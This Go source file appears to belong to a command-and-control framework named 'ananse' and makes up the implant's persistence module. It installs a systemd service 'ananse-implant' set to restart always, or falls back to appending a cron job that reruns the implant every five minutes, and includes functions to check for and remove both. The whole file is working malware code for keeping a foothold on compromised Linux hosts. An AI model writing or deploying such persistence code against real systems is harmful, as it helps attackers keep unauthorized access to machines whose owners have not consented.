package watchdog

import (
	"fmt"
	"os"

	"github.com/natx6/ananse/src/c2/implant/shell"
)

// Install tries to establish persistence via systemd then cron.
func Install(implantPath string) error {
	if err := installSystemd(implantPath); err == nil {
		return nil
	}
	return installCron(implantPath)
}

// Remove removes any persistence mechanisms.
func Remove() error {
	err1 := removeSystemd()
	err2 := removeCron()
	if err1 != nil && err2 != nil {
		return fmt.Errorf("systemd: %v; cron: %v", err1, err2)
	}
	return nil
}

// IsPersistent checks if persistence is active.
func IsPersistent() bool {
	// Check systemd unit
	_, err := shell.Run("systemctl is-enabled ananse-implant 2>/dev/null", 10e9)
	if err == nil {
		return true
	}
	// Check cron
	out, _ := shell.Run("crontab -l 2>/dev/null | grep ananse", 10e9)
	return out != ""
}

func installSystemd(path string) error {
	unit := fmt.Sprintf(`[Unit]
Description=Ananse Implant
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
`, path)

	if err := os.WriteFile("/etc/systemd/system/ananse-implant.service", []byte(unit), 0644); err != nil {
		return fmt.Errorf("write unit: %w", err)
	}

	_, err := shell.Run("systemctl daemon-reload && systemctl enable ananse-implant && systemctl start ananse-implant", 15e9)
	return err
}

func removeSystemd() error {
	_, _ = shell.Run("systemctl stop ananse-implant 2>/dev/null; systemctl disable ananse-implant 2>/dev/null", 10e9)
	_ = os.Remove("/etc/systemd/system/ananse-implant.service")
	_, _ = shell.Run("systemctl daemon-reload 2>/dev/null", 5e9)
	return nil
}

func installCron(path string) error {
	cronLine := fmt.Sprintf("*/5 * * * * %s\n", path)
	// Append to crontab
	_, err := shell.Run(fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronLine), 10e9)
	return err
}

func removeCron() error {
	// Remove lines containing "ananse" from crontab
	_, err := shell.Run("crontab -l 2>/dev/null | grep -v ananse | crontab - 2>/dev/null", 10e9)
	return err
}

func selfPath() string {
	exe, err := os.Executable()
	if err != nil {
		return "/proc/self/exe" // best-effort
	}
	return exe
}
